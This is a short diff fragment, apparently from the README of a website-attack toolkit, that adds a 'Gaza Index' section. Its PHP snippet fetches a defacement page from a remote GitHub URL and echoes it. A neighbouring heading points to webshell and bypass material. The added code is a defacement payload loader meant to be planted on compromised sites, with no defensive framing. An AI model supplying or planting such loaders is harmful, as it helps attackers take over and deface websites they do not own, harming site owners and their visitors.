@@ -6,6 +6,13 @@
   echo $index;
 ?>
 ```
+##### Gaza Index
+```
+<?php
+  $index = file_get_contents("https://raw.githubusercontent.com/iiMrDark/indexTeam/main/gaza-index");
+  echo $index;
+?>
+```
 
 #### ByPass | WebShell
 ```
